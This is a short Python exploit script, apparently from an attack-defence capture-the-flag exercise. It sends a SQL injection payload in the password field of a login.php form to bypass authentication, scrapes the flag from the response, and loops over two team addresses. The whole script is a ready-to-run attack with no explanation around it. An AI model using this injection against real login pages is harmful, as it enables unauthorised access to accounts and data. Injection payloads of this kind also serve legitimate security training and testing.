import requests
from bs4 import BeautifulSoup


# exploit
def sqli_request(ip, port):
    data = {
        'username': 'dummy@egibide.org',
        'password': 'blah\') or 1-- '
    }

    response = requests.post(
        f"http://{ip}:{port}/login.php",
        data=data
    )

    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find(id='flag').text.strip()


# test
TEAM_COUNT = 2
IP_MASK = '10.0.%d.101'

for team_number in range(1, TEAM_COUNT + 1):
    ip = IP_MASK % team_number
    content = sqli_request(ip, 80)
    print(ip)
    print(content)
